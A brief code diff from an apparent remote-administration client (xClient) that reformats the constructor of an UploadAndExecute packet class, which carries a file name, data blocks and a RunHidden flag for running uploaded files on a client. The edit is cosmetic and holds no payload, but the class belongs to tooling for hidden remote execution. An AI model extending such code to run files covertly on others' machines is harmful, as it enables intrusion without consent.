@@ -23,7 +23,10 @@ namespace xClient.Core.Packets.ServerPackets
         [ProtoMember(6)]
         public bool RunHidden { get; set; }
 
-        public UploadAndExecute() { }
+        public UploadAndExecute()
+        {
+        }
+
         public UploadAndExecute(int id, string filename, byte[] block, int maxblocks, int currentblock, bool runhidden)
         {
             this.ID = id;
